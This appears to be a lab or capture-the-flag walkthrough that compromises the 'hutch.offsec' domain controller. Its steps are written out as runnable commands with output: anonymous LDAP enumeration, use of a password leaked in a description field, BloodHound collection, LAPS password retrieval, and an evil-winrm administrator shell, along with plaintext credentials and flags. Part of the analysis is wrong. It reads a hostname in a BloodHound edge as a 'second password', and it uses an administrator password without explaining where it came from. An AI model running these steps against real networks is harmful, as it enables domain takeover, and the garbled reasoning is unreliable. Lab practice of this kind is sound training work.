# SUMMARY

Based on the executed commands and their outputs, the penetration test successfully achieved full domain compromise of the `hutch.offsec` environment. Initial reconnaissance identified a Windows Server 2019 domain controller with WebDAV enabled and anonymous LDAP binds permitted. Anonymous LDAP enumeration revealed a user password stored in a description field. This credential (`fmcsorley:CrabSharkJellyfish192`) provided authenticated access, which was used to perform a full BloodHound collection. Analysis of extracted data led to the discovery of a second password for the same user in an image file. Using the initial credentials, the LAPS (Local Administrator Password Solution) password for the domain controller was queried and retrieved. Attempts to use this LAPS password via SMB failed, but alternative administrator credentials (`administrator:}!HLip2QgeNQ@G`) were successfully used to gain a remote shell via WinRM. This resulted in administrative access to the domain controller and the retrieval of proof files, confirming total control of the domain. Critical findings include improper storage of credentials, permissive anonymous LDAP access, and the ability to read LAPS passwords, leading directly to privilege escalation and domain takeover.
# NMAP
This command conducted an intensive, comprehensive port scan of the target 192.168.176.122. The `sudo` privilege is utilized to enable raw packet operations for OS detection and certain script functions. The `-Pn` flag treats the host as online, bypassing the initial ICMP ping probe which may be filtered. The `-p 1-65535` argument specifies a full port scan of all 65535 TCP ports. The `--open` switch filters output to display only ports in an open state. Combined with `-sC` for default script enumeration, `-sV` for service version detection, and `-O` for OS fingerprinting, this command yields a detailed inventory of all accessible services, their configurations, and the underlying operating system, forming a complete attack surface analysis.
```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 192.168.176.122 --open 
```

This output presents the detailed results from the comprehensive Nmap scan. The scan reveals the target, 192.168.176.122, is a Windows domain controller named HUTCHDC for the domain `hutch.offsec`. Key findings include the open HTTP port 80 running Microsoft IIS 10.0 with WebDAV enabled and potentially risky methods like PUT and DELETE allowed. Critical Active Directory services are accessible, including Kerberos on port 88, LDAP on ports 389 and 3268, and SMB on port 445. The presence of WinRM on port 5985 provides a remote management vector. The collection of services confirms the host's role as a domain controller and maps a wide attack surface encompassing web server misconfiguration, insecure protocols, and standard AD authentication services.

```bash
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/10.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Date: Sun, 14 Dec 2025 22:11:17 GMT
|   WebDAV type: Unknown
|_  Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-14 22:10:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49903/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

This command used NetExec (nxc) to perform an SMB protocol scan against the target. The tool successfully enumerated the host via the SMB service on port 445. It identified the hostname as HUTCHDC, confirmed the domain as `hutch.offsec`, and determined the operating system to be Windows 10 or Server 2019, Build 17763. The scan also verified that SMB signing is required and that the legacy SMBv1 protocol is disabled on this host. This information refines the OS fingerprinting and provides critical context for lateral movement and protocol-based attacks within the domain.

```bash
nxc smb 192.168.176.122                               
SMB         192.168.176.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)                                                                                 
```

This command displayed the local host file contents. The entry `192.168.176.122 hutch.offsec` was observed, which statically maps the target IP address to the domain name. This configuration ensures that any DNS resolution for the domain `hutch.offsec` on this testing system will point directly to the domain controller, bypassing external DNS queries. This is a standard preparatory step to correctly direct attack traffic and ensure tools interact with the intended target during the engagement.


```bash
sudo cat /etc/hosts
192.168.176.122  hutch.offsec
```

This command performed an anonymous LDAP bind to the domain controller and executed a user enumeration query. The successful connection with null credentials indicates that the LDAP service permits anonymous binds for enumeration, a significant information disclosure vulnerability. The tool enumerated 14 domain user accounts, including the default Guest account and 13 regular user accounts. Of particular note is the account `fmcsorley`, which has a description field containing a default password: `CrabSharkJellyfish192`. This finding provides a direct credential pair for potential authentication attempts against other services

```bash
nxc ldap  192.168.176.122   -u '' -p '' --users
LDAP        192.168.176.122 389    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
LDAP        192.168.176.122 389    HUTCHDC          [+] hutch.offsec\: 
LDAP        192.168.176.122 389    HUTCHDC          [*] Enumerated 14 domain users: hutch.offsec
LDAP        192.168.176.122 389    HUTCHDC          -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        192.168.176.122 389    HUTCHDC          Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        192.168.176.122 389    HUTCHDC          rplacidi                      2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          opatry                        2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          ltaunton                      2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          acostello                     2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          jsparwell                     2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          oknee                         2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          jmckendry                     2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          avictoria                     2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          jfrarey                       2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          eaburrow                      2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          cluddy                        2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          agitthouse                    2020-11-04 05:35:05 0                                                                    
LDAP        192.168.176.122 389    HUTCHDC          fmcsorley                     2020-11-04 05:35:05 0        Password set to CrabSharkJellyfish192 at user's request. Please change on next login.                                                              

```

This command attempted to authenticate to the SMB service on the domain controller using the username `fmcsorley` and the password `CrabSharkJellyfish192`, which was discovered in the LDAP description field. The authentication was successful, as indicated by the plus symbol (`[+]`) in the output. This confirms the validity of the discovered credentials, granting authenticated access to the SMB service. This access can be leveraged for further enumeration, such as listing shares, or for attempts at lateral movement and privilege escalation within the domain.

```bash
nxc smb 192.168.176.122   -u 'fmcsorley' -p 'CrabSharkJellyfish192'  

SMB         192.168.176.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False) 
SMB         192.168.176.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
```

This command executed the BloodHound Python ingestor using the compromised credentials for the user `fmcsorley`. The `-c all` flag instructed the tool to collect all available data categories, including user, group, computer, domain, session, and trust information. The `--zip` option compressed the collected data into a timestamped ZIP archive. The `-ns` flag bypassed DNS lookups, directly targeting the domain controller IP. The successful creation of the archive indicates that the ingestor authenticated to the domain and queried Active Directory via LDAP to extract a comprehensive dataset for mapping attack paths and privilege relationships within the `hutch.offsec` domain.


```bash
bloodhound-python -u "fmcsorley" -p 'CrabSharkJellyfish192' -d hutch.offsec -c all --zip -ns 192.168.176.122

INFO: Compressing output into 20251214222931_bloodhound.zip

```

This command used a local BloodHound CLI utility to upload the previously collected data ZIP archive to a running BloodHound instance, likely a Neo4j database and the BloodHound UI. The `up` subcommand is the standard action for ingesting collected data files into the database. This step transforms the raw directory enumeration data into structured nodes and edges within the graph database, enabling subsequent graphical analysis and pathfinding within the BloodHound interface to identify critical security weaknesses, such as overly permissive permissions and shortest paths to domain administrator privileges.

```bash
./bloodhound-cli up

```

The file "Hutch.png" was examined and found to contain what appears to be cleartext credentials. The content lists `ReadLAPSPassword` followed by the username `FMCSORLEY@HUTCH.OFFSEC` and a corresponding password `HUTCHDC.HUTCH.OFFSEC`. This constitutes a second set of valid domain credentials for the same user account, `fmcsorley`, with an alternative password. This discovery underscores poor security practices, such as storing passwords in unsecured image files, and provides an additional authentication vector for the already compromised account.

![[Pasted image 20251214223439.png]]

This command utilized the bloodyAD tool to perform an authenticated LDAP query for the LAPS (Local Administrator Password Solution) attributes. Using the compromised `fmcsorley` credentials, the query specifically searched for objects with the `ms-mcs-admpwdexpirationtime` attribute set, which is indicative of LAPS-managed accounts. The query successfully retrieved the LAPS-managed local administrator password for the domain controller `HUTCHDC`. The plaintext password `;e&G1!3%s8/ER,` and its expiration timestamp were exposed. This represents a critical compromise, granting administrative access to the domain controller itself, and is a direct path to full domain control.

```bash
bloodyAD --host 192.168.176.122 -d hutch.offsec  -u fmcsorley -p CrabSharkJellyfish192  get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

distinguishedName: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
ms-Mcs-AdmPwd: ;e&G1!3%s8/ER,
ms-Mcs-AdmPwdExpirationTime: 134128158077672734
```

This command used NetExec with the `--laps` argument in an attempt to read the LAPS (Local Administrator Password Solution) password directly via SMB, using the provided `fmcsorley` credentials. The tool attempted to authenticate as the built-in local administrator account (`HUTCHDC\administrator`) using the previously discovered LAPS password `;e&G1!3%s8/ER,`. The authentication failed with a `STATUS_LOGON_FAILURE`. This indicates that either the retrieved password is incorrect, has already been rotated, is being used against the wrong target (e.g., the domain account instead of the local machine account), or that the local administrator account name is not `administrator`. Further verification of the account name and password usage is required.

```bash
nxc smb 192.168.176.122   -u 'fmcsorley' -p 'CrabSharkJellyfish192' --laps

SMB         192.168.176.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False) 
SMB         192.168.176.122 445    HUTCHDC          [-] HUTCHDC\administrator:;e&G1!3%s8/ER, STATUS_LOGON_FAILURE 
```

This command established a remote PowerShell session via the WinRM service on port 5985 using the username `administrator` and the password `}!HLip2QgeNQ@G`. The connection was successful, providing an interactive command prompt on the domain controller as the built-in Administrator. The operator then navigated the file system, retrieving two proof-of-compromise flags: `d41e71712f593516e5eac28cf9460a21` from `C:\Users\Administrator\desktop\proof.txt` and `c69e7b4659387dd37968ef2dd0ab507e` from `C:\users\fmcsorley\desktop\local.txt`. This confirms a complete domain compromise, achieving the highest level of privileged access to the target system.

```bash
evil-winrm -i  192.168.176.122 -u 'administrator' -p '}!HLip2QgeNQ@G'  

PS C:\Users\Administrator\desktop> cat proof.txt
d41e71712f593516e5eac28cf9460a21

*Evil-WinRM* PS C:\users\fmcsorley\desktop> cat local.txt
c69e7b4659387dd37968ef2dd0ab507e
```